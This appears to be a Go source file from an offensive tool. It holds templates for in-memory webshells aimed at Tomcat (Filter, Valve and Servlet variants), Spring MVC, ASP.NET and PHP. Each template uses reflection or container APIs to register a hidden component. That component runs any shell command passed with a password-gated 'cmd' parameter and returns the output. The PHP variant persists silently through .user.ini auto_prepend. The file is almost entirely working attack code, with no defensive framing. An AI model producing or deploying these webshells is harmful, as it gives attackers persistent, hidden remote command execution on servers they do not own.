package memshell

// 内存马矩阵模板。与 tomcatFilterTemplate 共用占位符约定（{{PASSWORD}}/{{FILTER_NAME}}/
// {{MAPPING}}/{{TRIGGER_PARAM}}/{{WATERMARK}}），全部免编译（JSP 声明类/动态代理/反射），
// 与注入器触发协议一致：?{{TRIGGER_PARAM}}=<密码> 注册，注册后 ?pass=<密码>&cmd=<命令> 回显。
//
//	kind                   容器/环境            注册目标
//	jsp-tomcat-filter       Tomcat 7-9(javax)    FilterDef/FilterMap/filterConfigs（/*）
//	jsp-tomcat-filter-jakarta Tomcat 10/11(jakarta) 同上（jakarta 命名空间）
//	jsp-tomcat-valve        Tomcat 7-9           Pipeline.addValve（JSP 内嵌 Valve 子类）
//	jsp-tomcat-servlet      Tomcat 7-9           StandardWrapper + Servlet 代理（{{MAPPING}}）
//	jsp-spring-controller   Spring MVC           registerSingleton + AbstractUrlHandlerMapping
//	aspx-httpmodule         IIS/.NET 4.5+        HttpApplication.RegisterModule
//	php-user-ini            PHP(任意)             .user.ini auto_prepend（Triggerless，两文件驻留）

// tomcatFilterJakartaTemplate jakarta 命名空间 Filter（Tomcat 10/11；描述符包名不变）。
const tomcatFilterJakartaTemplate = `<%-- {{WATERMARK}} --%>
<%@ page import="java.lang.reflect.*, java.util.*, jakarta.servlet.*" %>
<%
String pw = request.getParameter("{{TRIGGER_PARAM}}");
if (pw != null && pw.equals("{{PASSWORD}}")) {
    final String fPass = "{{PASSWORD}}";
    final String fName = "{{FILTER_NAME}}";
    try {
        jakarta.servlet.ServletContext sc = request.getServletContext();
        Field fCtx = sc.getClass().getDeclaredField("context");
        fCtx.setAccessible(true);
        Object appCtx = fCtx.get(sc);
        Field fStd = appCtx.getClass().getDeclaredField("context");
        fStd.setAccessible(true);
        Object stdCtx = fStd.get(appCtx);

        Class<?> filterDefCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        Class<?> filterMapCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        Class<?> appFilterConfigCls = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
        Class<?> contextCls = Class.forName("org.apache.catalina.Context");

        jakarta.servlet.Filter filter = (jakarta.servlet.Filter) Proxy.newProxyInstance(
            Thread.currentThread().getContextClassLoader(),
            new Class[]{ jakarta.servlet.Filter.class },
            new InvocationHandler() {
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    if ("doFilter".equals(method.getName())) {
                        jakarta.servlet.ServletRequest req = (jakarta.servlet.ServletRequest) args[0];
                        jakarta.servlet.ServletResponse resp = (jakarta.servlet.ServletResponse) args[1];
                        String p = req.getParameter("pass");
                        if (fPass.equals(p)) {
                            String c = req.getParameter("cmd");
                            if (c != null && c.length() > 0) {
                                String osName = System.getProperty("os.name", "").toLowerCase();
                                String[] sh = osName.contains("win") ? new String[]{"cmd.exe", "/c"} : new String[]{"/bin/sh", "-c"};
                                ProcessBuilder pb = new ProcessBuilder(sh[0], sh[1], c);
                                pb.redirectErrorStream(true);
                                java.io.InputStream in = pb.start().getInputStream();
                                java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(in));
                                java.io.PrintWriter w = resp.getWriter();
                                String line;
                                while ((line = br.readLine()) != null) { w.println(line); }
                                w.flush();
                                return null;
                            }
                        }
                        args[2].doFilter(args[0], args[1]);
                        return null;
                    }
                    return null;
                }
            });

        Object filterDef = filterDefCls.newInstance();
        filterDefCls.getMethod("setFilter", jakarta.servlet.Filter.class).invoke(filterDef, filter);
        filterDefCls.getMethod("setFilterName", String.class).invoke(filterDef, fName);
        filterDefCls.getMethod("setFilterClass", String.class).invoke(filterDef, filter.getClass().getName());
        stdCtx.getClass().getMethod("addFilterDef", filterDefCls).invoke(stdCtx, filterDef);

        Object filterMap = filterMapCls.newInstance();
        filterMapCls.getMethod("addURLPattern", String.class).invoke(filterMap, "/*");
        filterMapCls.getMethod("setFilterName", String.class).invoke(filterMap, fName);
        Class<?> dmCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        dmCls.getMethod("setDispatcher", String.class).invoke(filterMap, "REQUEST");
        stdCtx.getClass().getMethod("addFilterMapBefore", filterMapCls).invoke(stdCtx, filterMap);

        Field fCfgs = stdCtx.getClass().getDeclaredField("filterConfigs");
        fCfgs.setAccessible(true);
        Map cfgs = (Map) fCfgs.get(stdCtx);
        Constructor<?> ctor = appFilterConfigCls.getDeclaredConstructor(contextCls, filterDefCls);
        ctor.setAccessible(true);
        cfgs.put(fName, ctor.newInstance(stdCtx, filterDef));

        out.println("MEMSHELL_OK:" + fName);
    } catch (Exception e) {
        out.println("MEMSHELL_FAIL:" + e);
    }
} else {
    out.println("hello");
}
%>`

// tomcatValveTemplate Valve 型：JSP 声明类继承 ValveBase，注册进 StandardPipeline。
// Valve 在 Filter 链之前命中（engine 级前哨），兼容 Tomcat 7-9。
const tomcatValveTemplate = `<%-- {{WATERMARK}} --%>
<%@ page import="java.lang.reflect.*, java.util.*, javax.servlet.*" %>
<%!
public static class {{FILTER_NAME}}Valve extends org.apache.catalina.valves.ValveBase {
    private final String pw;
    public {{FILTER_NAME}}Valve(String pw) { this.pw = pw; }
    public void invoke(org.apache.catalina.connector.Request req, org.apache.catalina.connector.Response resp)
            throws java.io.IOException, javax.servlet.ServletException {
        String c = req.getParameter("cmd");
        if (pw.equals(req.getParameter("pass")) && c != null && c.length() > 0) {
            String osName = System.getProperty("os.name", "").toLowerCase();
            String[] sh = osName.contains("win") ? new String[]{"cmd.exe", "/c"} : new String[]{"/bin/sh", "-c"};
            ProcessBuilder pb = new ProcessBuilder(sh[0], sh[1], c);
            pb.redirectErrorStream(true);
            java.io.InputStream in = pb.start().getInputStream();
            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(in));
            java.io.PrintWriter w = resp.getWriter();
            String line;
            while ((line = br.readLine()) != null) { w.println(line); }
            w.flush();
            return;
        }
        getNext().invoke(req, resp);
    }
}
%>
<%
String pw = request.getParameter("{{TRIGGER_PARAM}}");
if (pw != null && pw.equals("{{PASSWORD}}")) {
    try {
        ServletContext sc = request.getServletContext();
        Field fCtx = sc.getClass().getDeclaredField("context");
        fCtx.setAccessible(true);
        Object appCtx = fCtx.get(sc);
        Field fStd = appCtx.getClass().getDeclaredField("context");
        fStd.setAccessible(true);
        Object stdCtx = fStd.get(appCtx);

        Object pipeline = stdCtx.getClass().getMethod("getPipeline").invoke(stdCtx);
        Object valve = new {{FILTER_NAME}}Valve("{{PASSWORD}}");
        pipeline.getClass().getMethod("addValve", Class.forName("org.apache.catalina.Valve")).invoke(pipeline, valve);
        out.println("MEMSHELL_OK:{{FILTER_NAME}}");
    } catch (Exception e) {
        out.println("MEMSHELL_FAIL:" + e);
    }
} else {
    out.println("hello");
}
%>`

// tomcatServletTemplate Servlet 型：Servlet 接口动态代理 + StandardWrapper 注册到 {{MAPPING}}。
// 注册后命令 URL = 应用路径{{MAPPING}}?pass=<密码>&cmd=<命令>。
const tomcatServletTemplate = `<%-- {{WATERMARK}} --%>
<%@ page import="java.lang.reflect.*, java.util.*, javax.servlet.*" %>
<%
String pw = request.getParameter("{{TRIGGER_PARAM}}");
if (pw != null && pw.equals("{{PASSWORD}}")) {
    final String fPass = "{{PASSWORD}}";
    final String fName = "{{FILTER_NAME}}";
    try {
        ServletContext sc = request.getServletContext();
        Field fCtx = sc.getClass().getDeclaredField("context");
        fCtx.setAccessible(true);
        Object appCtx = fCtx.get(sc);
        Field fStd = appCtx.getClass().getDeclaredField("context");
        fStd.setAccessible(true);
        Object stdCtx = fStd.get(appCtx);

        Servlet proxy = (Servlet) Proxy.newProxyInstance(
            Thread.currentThread().getContextClassLoader(),
            new Class[]{ Servlet.class },
            new InvocationHandler() {
                public Object invoke(Object p, Method method, Object[] args) throws Throwable {
                    if ("service".equals(method.getName())) {
                        javax.servlet.ServletRequest req = (javax.servlet.ServletRequest) args[0];
                        javax.servlet.ServletResponse resp = (javax.servlet.ServletResponse) args[1];
                        String pv = req.getParameter("pass");
                        if (fPass.equals(pv)) {
                            String c = req.getParameter("cmd");
                            if (c != null && c.length() > 0) {
                                String osName = System.getProperty("os.name", "").toLowerCase();
                                String[] sh = osName.contains("win") ? new String[]{"cmd.exe", "/c"} : new String[]{"/bin/sh", "-c"};
                                ProcessBuilder pb = new ProcessBuilder(sh[0], sh[1], c);
                                pb.redirectErrorStream(true);
                                java.io.InputStream in = pb.start().getInputStream();
                                java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(in));
                                java.io.PrintWriter w = resp.getWriter();
                                String line;
                                while ((line = br.readLine()) != null) { w.println(line); }
                                w.flush();
                            }
                        }
                        return null;
                    }
                    return null;
                }
            });

        Class<?> wrapperCls = Class.forName("org.apache.catalina.core.StandardWrapper");
        Class<?> containerCls = Class.forName("org.apache.catalina.Container");
        Object wrapper = wrapperCls.newInstance();
        wrapperCls.getMethod("setName", String.class).invoke(wrapper, fName);
        wrapperCls.getMethod("setServlet", Servlet.class).invoke(wrapper, proxy);
        stdCtx.getClass().getMethod("addChild", containerCls).invoke(stdCtx, wrapper);
        wrapperCls.getMethod("addMapping", String.class).invoke(wrapper, "{{MAPPING}}");
        try {
            stdCtx.getClass().getMethod("addServletMappingDecoded", String.class, String.class)
                  .invoke(stdCtx, "{{MAPPING}}", fName);
        } catch (Exception ignore) { /* 老版本容器 mapper 由 addChild 兜底 */ }

        out.println("MEMSHELL_OK:" + fName + ":{{MAPPING}}");
    } catch (Exception e) {
        out.println("MEMSHELL_FAIL:" + e);
    }
} else {
    out.println("hello");
}
%>`

// springControllerTemplate Spring MVC Controller 型：Controller 接口动态代理 +
// registerSingleton + AbstractUrlHandlerMapping.registerHandler（protected，逐级找方法反射调用）。
// 要求同 webapp 存在 DispatcherServlet 上下文；命中路径 {{MAPPING}}。
const springControllerTemplate = `<%-- {{WATERMARK}} --%>
<%@ page import="java.lang.reflect.*, java.util.*, javax.servlet.*" %>
<%
String pw = request.getParameter("{{TRIGGER_PARAM}}");
if (pw != null && pw.equals("{{PASSWORD}}")) {
    final String fPass = "{{PASSWORD}}";
    final String fName = "{{FILTER_NAME}}";
    try {
        ServletContext sc = request.getServletContext();
        Object wac = null;
        try {
            wac = Class.forName("org.springframework.web.context.support.WebApplicationContextUtils")
                    .getMethod("getWebApplicationContext", javax.servlet.ServletContext.class).invoke(null, sc);
        } catch (Exception ignore) { }
        if (wac == null) {
            wac = request.getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT");
        }
        if (wac == null) {
            throw new IllegalStateException("spring context not found");
        }

        final Class<?> controllerCls = Class.forName("org.springframework.web.servlet.Controller");
        Object proxy = Proxy.newProxyInstance(
            Thread.currentThread().getContextClassLoader(),
            new Class[]{ controllerCls },
            new InvocationHandler() {
                public Object invoke(Object p, Method method, Object[] args) throws Throwable {
                    if ("handleRequest".equals(method.getName())) {
                        javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest) args[0];
                        javax.servlet.http.HttpServletResponse resp = (javax.servlet.http.HttpServletResponse) args[1];
                        String pv = req.getParameter("pass");
                        if (fPass.equals(pv)) {
                            String c = req.getParameter("cmd");
                            if (c != null && c.length() > 0) {
                                String osName = System.getProperty("os.name", "").toLowerCase();
                                String[] sh = osName.contains("win") ? new String[]{"cmd.exe", "/c"} : new String[]{"/bin/sh", "-c"};
                                ProcessBuilder pb = new ProcessBuilder(sh[0], sh[1], c);
                                pb.redirectErrorStream(true);
                                java.io.InputStream in = pb.start().getInputStream();
                                java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(in));
                                java.io.PrintWriter w = resp.getWriter();
                                String line;
                                while ((line = br.readLine()) != null) { w.println(line); }
                                w.flush();
                            }
                        }
                        return null;
                    }
                    return null;
                }
            });

        Object bf = wac.getClass().getMethod("getAutowireCapableBeanFactory").invoke(wac);
        bf.getClass().getMethod("registerSingleton", String.class, Object.class).invoke(bf, fName, proxy);

        int mapped = 0;
        Class<?> mappingCls = Class.forName("org.springframework.web.servlet.handler.AbstractUrlHandlerMapping");
        String[] names = (String[]) wac.getClass().getMethod("getBeanNamesForType", Class.class)
                .invoke(wac, mappingCls);
        for (String n : names) {
            Object m = wac.getClass().getMethod("getBean", String.class).invoke(wac, n);
            Method rm = null;
            for (Class<?> cc = m.getClass(); cc != null && rm == null; cc = cc.getSuperclass()) {
                try { rm = cc.getDeclaredMethod("registerHandler", String.class, Object.class); } catch (Exception ignore) { }
            }
            if (rm != null) {
                rm.setAccessible(true);
                rm.invoke(m, "{{MAPPING}}", fName);
                mapped++;
            }
        }
        if (mapped == 0) {
            throw new IllegalStateException("no AbstractUrlHandlerMapping bean found");
        }
        out.println("MEMSHELL_OK:" + fName + ":{{MAPPING}}");
    } catch (Exception e) {
        out.println("MEMSHELL_FAIL:" + e);
    }
} else {
    out.println("hello");
}
%>`

// aspxHttpModuleTemplate ASP.NET HttpModule 型（.NET 4.5+ HttpApplication.RegisterModule）。
// 注册后全站请求进入 BeginRequest 判定 pass/cmd；ASPX 单文件页嵌类免编译。
const aspxHttpModuleTemplate = `<%@ Page Language="C#" %>
<%-- {{WATERMARK}} --%>
<script runat="server">
public class {{FILTER_NAME}}Module : IHttpModule {
    public void Init(HttpApplication app) {
        app.BeginRequest += new EventHandler(WsBegin);
    }
    public void Dispose() { }
    void WsBegin(object sender, EventArgs e) {
        HttpApplication app = (HttpApplication)sender;
        System.Web.HttpContext ctx = app.Context;
        if (ctx.Request["pass"] == "{{PASSWORD}}" && !string.IsNullOrEmpty(ctx.Request["cmd"])) {
            string c = ctx.Request["cmd"];
            bool win = System.Environment.OSVersion.Platform.ToString().Contains("Win32NT");
            var psi = win
                ? new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + c)
                : new System.Diagnostics.ProcessStartInfo("/bin/sh", "-c " + c);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            var p = System.Diagnostics.Process.Start(psi);
            ctx.Response.Write(p.StandardOutput.ReadToEnd());
            p.WaitForExit();
            ctx.Response.End();
        }
    }
}
protected void Page_Load(object sender, EventArgs e) {
    if (Request["{{TRIGGER_PARAM}}"] == "{{PASSWORD}}") {
        try {
            System.Web.HttpApplication.RegisterModule(typeof({{FILTER_NAME}}Module));
            Response.Write("MEMSHELL_OK:{{FILTER_NAME}}");
        } catch (Exception ex) {
            Response.Write("MEMSHELL_FAIL:" + ex.Message);
        }
    } else {
        Response.Write("hello");
    }
}
</script>`

// phpUserIniPayloadTemplate php-user-ini 的载荷文件（.user.ini 由 ExtraFiles 生成）。
// 静默逻辑：无 pass 参数时不产生任何输出，随目录内任意 PHP 请求被 auto_prepend。
const phpUserIniPayloadTemplate = `<?php /*{{WATERMARK}}*/
if (isset($_REQUEST['pass']) && $_REQUEST['pass'] === '{{PASSWORD}}') {
    $c = $_REQUEST['cmd'];
    if (function_exists('system')) { @system($c); }
    elseif (function_exists('passthru')) { @passthru($c); }
    elseif (function_exists('shell_exec')) { echo @shell_exec($c); }
    elseif (function_exists('exec')) { @exec($c, $o); echo implode("\n", (array)$o); }
}
?>`
